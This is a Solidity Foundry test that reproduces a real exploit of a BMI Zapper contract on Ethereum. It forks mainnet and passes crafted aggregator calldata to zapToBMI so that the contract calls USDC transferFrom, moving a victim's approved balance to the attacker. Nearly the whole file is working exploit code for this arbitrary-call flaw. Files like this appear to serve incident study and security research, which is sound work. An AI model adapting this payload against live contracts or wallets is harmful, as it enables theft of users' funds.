// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 114,000 USDC
    - Attacker: https://etherscan.io/address/0x63136677355840f26c0695dd6de5c9e4f514f8e8
    - Attack Contract: https://etherscan.io/address/0xae5919160a646f5d80d89f7aae35a2ca74738440
    - Vuln Contract: https://etherscan.io/address/0x4622aff8e521a444c9301da0efd05f6b482221b8
    - Attack Tx: https://phalcon.blocksec.com/explorer/tx/eth/0x97201900198d0054a2f7a914f5625591feb6a18e7fc6bb4f0c964b967a6c15f6
    - Analysis: https://x.com/0xmstore/status/1747756898172952725?s=20
*/

interface IBMIZapper {
    function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
    ) external returns (uint256);
}

contract ExploitTest is Test {
    IBMIZapper bmiZapper = IBMIZapper(0x4622aFF8E521A444C9301dA0efD05f6b482221b8);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 BUSD = IERC20(0x4Fabb145d64652a948d72533023f6E7A623C7C53);

    address victim = 0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d;
    address attacker = address(this);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_029_290 - 1);
        cheats.label(address(bmiZapper), "BMIZapper");
        cheats.label(address(USDC), "USDC");
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "Victim's USDC balance before exploit",
            USDC.balanceOf(victim),
            USDC.decimals()
        );

        uint256 victimBalance = USDC.balanceOf(victim);

        address[] memory bmiConstituents = new address[](0); // Empty bmiConstituents array
        uint256[] memory bmiConstituentsWeightings = new uint256[](1);
        bmiConstituentsWeightings[0] = 1e18; // 100% weighting for demonstration

        // Craft malicious data to call a transferFrom function in the USDC token contract

        bytes memory maliciousCallData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,
            attacker,
            victimBalance
        );

        // Call zapToBMI with malicious aggregator data

        bmiZapper.zapToBMI(
            address(BUSD), // BUSD
            0, // _amount
            address(0), // _fromUnderlying 
            0, // _fromUnderlyingAmount 
            0, // _minBMIRecv
            bmiConstituents,
            bmiConstituentsWeightings,
            address(USDC), // _aggregator
            maliciousCallData, // _aggregatorData
            true 
        );

        emit log_named_decimal_uint(
            "Victim's USDC balance after exploit",
            USDC.balanceOf(victim),
            USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker's USDC balance after exploit",
            USDC.balanceOf(attacker),
            USDC.decimals()
        );
    }
}
